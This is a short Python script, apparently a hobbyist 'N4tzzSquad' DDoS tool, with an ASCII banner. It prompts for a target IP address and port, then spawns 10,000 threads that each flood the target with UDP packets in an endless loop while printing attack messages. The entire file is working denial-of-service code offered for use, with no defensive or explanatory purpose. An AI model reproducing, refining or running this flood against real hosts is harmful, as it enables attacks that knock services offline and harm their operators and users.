#!/usr/bin/env python3

import socket
import threading
import os

def set_red_text():
    os.system('color 4')

banner = """
███╗   ██╗██╗  ██╗████████╗███████╗███████╗    ██████╗ ██████╗  ██████╗ ███████╗         █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
████╗  ██║██║  ██║╚══██╔══╝╚══███╔╝╚══███╔╝    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝        ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
██╔██╗ ██║███████║   ██║     ███╔╝   ███╔╝     ██║  ██║██║  ██║██║   ██║███████╗        ███████║   ██║      ██║   ███████║██║     █████╔╝ 
██║╚██╗██║╚════██║   ██║    ███╔╝   ███╔╝      ██║  ██║██║  ██║██║   ██║╚════██║        ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
██║ ╚████║     ██║   ██║   ███████╗███████╗    ██████╔╝██████╔╝╚██████╔╝███████║███████╗██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
╚═╝  ╚═══╝     ╚═╝   ╚═╝   ╚══════╝╚══════╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
"""

def ddos_attack(ip, port):
    data = "DDos_Attack By N4tzzSquad!" * 1000
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (ip, port)
            s.sendto(data.encode(), addr)
            print(f"\033[91mN4tzzSquad Sending Request to {ip}:{port}!!!\033[0m")
        except Exception as e:
            print(f"\033[91mError: {e}\033[0m")
        finally:
            s.close()

def start_attack(ip, port, threads):
    for i in range(threads):
        thread = threading.Thread(target=ddos_attack, args=(ip, port))
        thread.start()

set_red_text()
print(banner)

target_ip = input("IP Address: ")
target_port = int(input("Port: "))
threads = 10000

print(f"\033[91mStarting DDoS Attack on {target_ip}:{target_port} with {threads} threads!\033[0m")
start_attack(target_ip, target_port, threads)
